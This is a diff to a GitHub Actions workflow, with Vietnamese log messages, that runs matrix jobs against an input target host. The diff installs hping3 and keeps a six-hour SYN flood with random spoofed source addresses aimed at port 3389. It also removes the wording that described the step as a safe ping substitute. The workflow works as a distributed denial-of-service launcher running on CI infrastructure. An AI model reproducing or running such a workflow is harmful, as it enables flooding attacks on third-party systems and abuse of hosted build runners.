@@ -31,7 +31,8 @@ jobs:
         run: |
           TARGET="${{ github.event.inputs.target_host }}"
           JOB_ID="${{ matrix.job_id }}"
-          echo "Job $JOB_ID: Minh họa lệnh hping3 với nguồn ngẫu nhiên và verbose (Chạy Lệnh PING an toàn thay thế)."
+          echo "Job $JOB_ID: Minh họa lệnh hping3 với nguồn ngẫu nhiên ."
+          sudo apt install -y hping3
           timeout 360m sudo hping3 -S -V --rand-source --flood -p 3389 $TARGET
       - name: ✅ Log Job End
         run: echo "Hoàn thành Job ${{ matrix.job_id }}."
